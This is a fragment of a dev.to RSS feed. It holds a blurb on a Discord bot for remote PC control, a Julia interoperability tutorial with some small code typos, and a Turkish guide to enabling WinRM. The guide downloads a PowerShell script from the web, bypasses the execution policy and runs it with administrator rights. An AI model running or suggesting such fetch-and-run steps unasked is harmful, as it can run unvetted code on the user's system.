&lt;p&gt;&lt;strong&gt;Reco PC Server&lt;/strong&gt; is a cross platform PC Controller Discord Bot which helps you to control your system easily &amp;amp; it's written in Python discord.py.&lt;/p&gt;

&lt;p&gt;Using Reco you can easily control your computer remotely and have it do from simple tasks such as shutdown, sleep, and lock to opening a website or executing powershell commands. Currently Reco has more than 35 commands. &lt;a href="https://dev.to/arvinthkrishna/control-your-pc-using-discord-reco-pc-server-3pgd"&gt;To know more...&lt;/a&gt;&lt;/p&gt;

</description>
      <category>logo</category>
      <category>reco</category>
      <category>discord</category>
      <category>python</category>
    </item>
    <item>
      <title>Interoperability in Julia</title>
      <author>Ifihan Olusheye</author>
      <pubDate>Sun, 23 Jan 2022 16:20:54 +0000</pubDate>
      <link>https://dev.to/ifihan/interoperability-in-julia-3im9</link>
      <guid>https://dev.to/ifihan/interoperability-in-julia-3im9</guid>
      <description>&lt;h3&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  INTRODUCTION
&lt;/h3&gt;

&lt;p&gt;One of the features Julia has to offer is Interoperability. Language interoperability could be defined as the ability for two or more languages to interact or communicate for effective data transmission in a system.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;P.S:&lt;/strong&gt; I wrote on &lt;a href="https://ifihan.hashnode.dev/language-interoperability"&gt;Interoperability&lt;/a&gt;; check it out!&lt;/p&gt;

&lt;p&gt;With the help of various packages, Julia can call several programming languages. &lt;a href="https://github.com/JuliaInterop"&gt;JuliaInterop&lt;/a&gt; is a GitHub organization that has created several packages that can be used to integrate Julia with different languages. In this article, we will be looking at integration with Python, R, and C++.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#1-python"&gt;
  &lt;/a&gt;
  1. Python
&lt;/h3&gt;

&lt;p&gt;It is possible to call Python from Julia using &lt;a href="https://github.com/JuliaPy/PyCall.jl"&gt;PyCall&lt;/a&gt;. Then to install PyCall, run the command in the Julia REPL.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;using Pkg
Pkg.add("PyCall")
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;PyCall will download the Miniconda installer and create a separated conda environment just for Julia all by itself.&lt;/p&gt;

&lt;p&gt;An example&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;julia&amp;gt; usig PyCall
&amp;gt;&amp;gt;&amp;gt; math = pyimport("math")
&amp;gt;&amp;gt;&amp;gt; math.sin(math.pi / 4) # returns ≈ 1/√2 = 0.70710678...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#2-r"&gt;
  &lt;/a&gt;
  2. R
&lt;/h3&gt;

&lt;p&gt;To inter-operate Julia with the R language, the &lt;a href="https://github.com/JuliaInterop/RCall.jl"&gt;RCall&lt;/a&gt; package is used. Run the following commands on the Julia REPL&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;using Pkg
Pkg.add("RCall")
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will automatically install R using Conda if R is not detected. For further customization, check out the &lt;a href="https://juliainterop.github.io/RCall.jl/stable/installation/"&gt;documentation&lt;/a&gt; page &lt;br&gt;
Example&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;julia&amp;gt; using RCall # This will initialize the R process in the background
julia&amp;gt; num = 7
julia&amp;gt; print(num)
7
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Macros transfer can also occur between variables in the R and Julia environments. The copied variable will have the same name as the original.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;julia&amp;gt; x = 57
1

julia&amp;gt; @rput x
57
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;More methods can be found on the official &lt;a href="https://juliainterop.github.io/RCall.jl/stable/"&gt;website&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3-c"&gt;
  &lt;/a&gt;
  3. C++
&lt;/h3&gt;

&lt;p&gt;It is possible to call C++ into Julia with the package &lt;a href="https://github.com/JuliaInterop/Cxx.jl"&gt;Cxx&lt;/a&gt;. To install the &lt;code&gt;Cxx&lt;/code&gt; package, run the following command on the Julia REPL.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;using Pkg
Pkg.add("Cxx")
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For further installation guides (like system requirements), visit the repository &lt;a href="https://github.com/JuliaInterop/Cxx.jl"&gt;README&lt;/a&gt; for more information.&lt;/p&gt;

&lt;p&gt;A simple example of embedding a C++ function in Julia&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;# include headers
julia&amp;gt; using Cxx
julia&amp;gt; cxx""" #include&amp;lt;iostream&amp;gt; """

# Declare the function
julia&amp;gt; cxx"""
         void mycppfunction() {
            int z = 0;
            int y = 5;
            int x = 10;
            z = x*y + 2;
            std::cout &amp;lt;&amp;lt; "The number is " &amp;lt;&amp;lt; z &amp;lt;&amp;lt; std::endl;
         }
      """
# Convert C++ to Julia function
julia&amp;gt; julia_function() = @cxx mycppfunction()
julia_function (generic function with 1 method)

# Run the function
julia&amp;gt; julia_function()
The number is 52
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;N.B:&lt;/strong&gt; Most of the examples were extracted from the official repository pages of these packages. Check out &lt;a href="https://github.com/JuliaInterop"&gt;Juliainterop&lt;/a&gt; for more examples and guides on other languages that can be called into Julia.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  CONCLUSION
&lt;/h3&gt;

&lt;p&gt;It has been seen how possible it is to call some programming languages from Julia. This also establishes the fact that Julia is a friendly language and can  be the go-to when it comes to building a system with multiple languages (Interoperability).&lt;/p&gt;

</description>
      <category>programming</category>
      <category>python</category>
      <category>julialang</category>
    </item>
    <item>
      <title>Liman veya Ansible uzak yönetim için WinRM açma</title>
      <author>Ali Orhun Akkirman</author>
      <pubDate>Sun, 23 Jan 2022 16:03:26 +0000</pubDate>
      <link>https://dev.to/aciklab/liman-veya-ansible-uzak-yonetim-icin-winrm-acma-3903</link>
      <guid>https://dev.to/aciklab/liman-veya-ansible-uzak-yonetim-icin-winrm-acma-3903</guid>
      <description>&lt;p&gt;Liman MYS ve Ansible gibi sistemler uzaktan Windows sunuculara erişim için WinRM gibi protokollere ihtiyaç duymaktadır. Windows'un güncel sunucuları kendi içerisinde OpenSSH sunucu servisini de seçmeli olarak sunabilmesine rağmen hala WinRM'in tercih edildiği de görülmekte.&lt;/p&gt;

&lt;p&gt;Aşağıdaki çalışmada WinRM'i SSL'li bir şekilde 5986 portu üzerinden kullanılabilmesi için yapılması gerekenler gösterilecektir.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#i%CC%87lgili-beti%C4%9Fin-windows-sunucuna-indirilmesi-ve-kurulmas%C4%B1"&gt;
  &lt;/a&gt;
  İlgili betiğin Windows sunucuna indirilmesi ve kurulması
&lt;/h1&gt;

&lt;p&gt;İlgili betiği Windows sunucusuna indirmek için aşağıdaki komutu &lt;strong&gt;yetkili kullanıcı ile açılmış&lt;/strong&gt; &lt;em&gt;powershell&lt;/em&gt; veya &lt;em&gt;windows terminal&lt;/em&gt; üzerinden çalıştırmak gerekiyor.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;invoke-webrequest -Uri https://liman.dev/winrm -Outfile winrm.ps1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Bu adımdan sonra yetki edinmek için aşağıdaki komutu uygulamanız gerekmektedir.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Set-ExecutionPolicy Bypass -Scope Process -Force
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Bu adımdan sonra güvenlik gereği sadece belirli IP'den WinRM isteğinde bulunacaksanız aşağıdaki komutu kullanmanız gerekmektedir. Eğer böyle bir kısıt bulunmuyorsa Instance parametresini kullanmayabilirsiniz.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;.\winrm.ps1 -Instance "IP_ADRESI" 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Bu adımdan sonra belirttiğiniz IP Adresinden, 5986 portunu kullanarak SSL'li WinRM sorguları atabilirsiniz.&lt;/p&gt;

</description>
      <category>liman</category>
      <category>ansible</category>
      <category>winrm</category>
    </item>
  </channel>
</rss>
